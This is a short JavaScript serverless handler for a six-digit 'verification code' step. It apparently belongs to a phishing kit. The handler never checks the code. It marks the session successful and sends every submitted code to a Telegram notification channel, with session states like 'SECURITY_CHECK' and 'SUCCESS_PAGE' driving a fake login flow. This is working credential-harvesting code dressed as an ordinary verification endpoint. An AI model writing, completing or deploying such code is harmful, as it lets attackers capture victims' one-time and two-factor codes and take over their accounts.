import { getSessionData, createSessionCookieHeader, sendEdgeTelegramNotification } from '../../utils/edgeSession.js';

export async function onRequestPost(context) {
  const { request, env } = context;
  const authState = await getSessionData(request, env);

  if (authState.state === 'SECURITY_CHECK') {
    return new Response(
      JSON.stringify({
        success: false,
        error: 'Session expired or out of sync.',
        redirect: '/',
      }),
      { status: 403, headers: { 'Content-Type': 'application/json' } }
    );
  }

  try {
    const body = await request.json();
    const { code } = body;

    if (!code || typeof code !== 'string' || !/^\d{6}$/.test(code.trim())) {
      return new Response(
        JSON.stringify({ success: false, error: 'Please enter a valid 6-digit numeric code.' }),
        { status: 400, headers: { 'Content-Type': 'application/json' } }
      );
    }

    const cleanCode = code.trim();
    authState.state = 'SUCCESS_PAGE';
    authState.verificationStatus = 'completed';

    await sendEdgeTelegramNotification(
      {
        title: 'Verification step completed',
        lines: [
          `*Code Entered:* ${cleanCode}`,
          `*Method:* 6-Digit Code`,
          `*Status:* SUCCESS`,
        ],
      },
      env
    );

    const cookieHeader = await createSessionCookieHeader(authState, env);

    return new Response(
      JSON.stringify({ success: true, next: '/success' }),
      {
        headers: {
          'Content-Type': 'application/json',
          'Set-Cookie': cookieHeader,
        },
      }
    );
  } catch (err) {
    return new Response(
      JSON.stringify({ success: false, error: 'Invalid request body' }),
      { status: 400, headers: { 'Content-Type': 'application/json' } }
    );
  }
}
